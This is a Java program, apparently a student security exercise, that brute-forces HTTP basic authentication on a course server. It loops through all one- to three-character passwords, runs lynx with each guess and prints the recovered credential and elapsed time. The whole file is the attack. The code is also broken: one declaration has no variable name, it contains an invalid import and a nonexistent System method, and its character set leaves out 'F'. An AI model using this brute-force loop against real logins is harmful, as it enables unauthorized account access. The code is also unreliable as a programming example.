
import java.net.*;
import java.*;
import java.io.*;
import java.util.GregorianCalendar;
public class BruteForce
{

    private char passwd_Array []={'a','b','c','d','e','f','g','h','i','j','k',
    'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B',
    'C','D','E','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V',
    'W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','\'','.','&'};
    private int num=1;
    public void crackAddress() throws Exception
    {
       String line,username="",passwd;
       int flag=0;
       Runtime run = Runtime.getRuntime();
       GregorianCalendar =new GregorianCalendar();
       for(int k=0;k<passwd_Array.length;k++)
       {
            for(int j=0;j<passwd_Array.length;j++)
            {
                for(int i=0;i<passwd_Array.length;i++)
                {
                 passwd =(new StringBuffer().append(passwd_Array[i]).append(passwd_Array[j]).append(passwd_Array[k])).toString();
                 System.out.println("Check with word:"+passwd.trim());
                 String command_line = "lynx http://sec-crack.cs.rmit.edu./SEC/2/ -auth="+username+":"+passwd.trim()+" -dump";
                 Process result = run.exec(command_line);
                 BufferedReader bf = new BufferedReader(new InputStreamReader(result.getInputStream()));
                 while((line=bf.readLine())!=null)
                {
                 flag=1;
                 break;
                }
                if(flag==1)
                 {
                    System.out.println("The username is: "+username+" The password is: "+passwd);
                     break;
                 }
                }
                if(flag==1)
                 break;
              }
              if(flag==1)
                break;
       }
       if(flag==0)
       {
           for(int i=0;i<passwd_Array.length;i++)
             {
                for(int j=0;j<passwd_Array.length;j++)
                {
                 passwd =(new StringBuffer().append(passwd_Array[i]).append(passwd_Array[j])).toString();
                 System.out.println("Check with word:"+passwd);
                 String command_line = "lynx http://sec-crack.cs.rmit.edu./SEC/2/ -auth="+username+":"+passwd+" -dump";
                 Process result = run.exec(command_line);
                 BufferedReader bf = new BufferedReader(new InputStreamReader(result.getInputStream()));
                while((line=bf.readLine())!=null)
                {
                 flag=1;
                 break;
                }
                if(flag==1)
                 {
                    System.out.println("The username is: "+username+" The password is: "+passwd);
                     break;
                 }
                }
                if(flag==1)
                  break;
             }
             if(flag==0)
              {
                  for(int j=0;j<passwd_Array.length;j++)
                {
                 passwd =(new StringBuffer().append(passwd_Array[j])).toString();
                 System.out.println("Check with word:"+passwd);
                 String command_line = "lynx http://sec-crack.cs.rmit.edu./SEC/2/ -auth="+username+":"+passwd+" -dump";
                 Process result = run.exec(command_line);
                 BufferedReader bf = new BufferedReader(new InputStreamReader(result.getInputStream()));
                while((line=bf.readLine())!=null)
                {
                 flag=1;
                 break;
                }
                if(flag==1)
                 {
                    System.out.println("The username is: "+username+" The password is: "+passwd);
                     break;
                 }
                }
              }
         }
       GregorianCalendar end=new GregorianCalendar();
       double time = (double)(end.getTimeInMillis()-System.getTimeInMillis())/1e3;
       System.out.println("The attack use"+time+" seconds.");
    }

public static void main(String args[]) throws Exception
{
   BruteForce bf = new BruteForce();
   bf.crackAddress();
}
}